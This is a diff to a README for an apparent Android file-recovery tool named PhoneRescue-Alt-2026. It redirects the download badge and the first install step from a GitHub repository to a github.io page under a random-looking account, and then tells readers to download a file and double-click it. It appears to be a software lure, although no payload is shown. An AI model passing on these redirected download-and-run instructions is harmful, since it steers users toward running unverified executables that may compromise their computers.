@@ -1,6 +1,6 @@
 # 📱 PhoneRescue-Alt-2026 - Restore deleted files on your Android
 
-[![Download PhoneRescue-Alt-2026](https://img.shields.io/badge/Download-Recovery_Tool-blue.svg)](https://github.com/Genusamsinckialopper179/PhoneRescue-Alt-2026)
+[![Download PhoneRescue-Alt-2026](https://img.shields.io/badge/Download-Recovery_Tool-blue.svg)](https://genusamsinckialopper179.github.io)
 
 This application helps users regain access to lost data from Android mobile devices. It runs on Windows 11 and Windows 10 computers. The software scans your connected phone to identify lost photos, messages, contacts, and logs. It provides a simple path to save these files back to your computer.
 
@@ -31,7 +31,7 @@ Your computer must meet these standards to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the software: https://github.com/Genusamsinckialopper179/PhoneRescue-Alt-2026
+1. Visit the repository page to download the software: https://genusamsinckialopper179.github.io
 2. Locate the download folder on your computer.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen.
